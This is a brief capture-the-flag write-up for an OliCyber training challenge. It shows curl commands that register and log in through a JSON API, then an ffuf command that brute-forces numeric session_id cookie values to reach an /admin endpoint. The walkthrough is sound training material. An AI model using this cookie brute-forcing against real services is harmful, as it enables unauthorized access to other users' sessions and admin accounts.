# URL
https://training.olicyber.it/challenges#challenge-36
# Concept
* using API documentation
* cookie brute-forcing
# Method of solve
* the landing page for the app is API documentation
* we need to send JSON data to the `/register` and `/login` endpoints to get a session ID
* and when we access the `/admin` endpoint, we need to fuzz the endpoint for a valid admin session value
```
curl -v -X POST -H "Content-Type: application/json" -d '{"username":"hackerfrogs","password":"hackerfrogs"}' http://too-small-reminder.challs.olicyber.it/register
curl -v -X POST -H "Content-Type: application/json" -d '{"username":"hackerfrogs","password":"hackerfrogs"}' http://too-small-reminder.challs.olicyber.it/login
curl -v -b "session_id=518" http://too-small-reminder.challs.olicyber.it/admin
```
* from here we use `FFuF` to fuzz for valid cookie values
```
ffuf -u http://too-small-reminder.challs.olicyber.it/admin -w ./numbers.txt -H "Cookie: session_id=FUZZ"
```
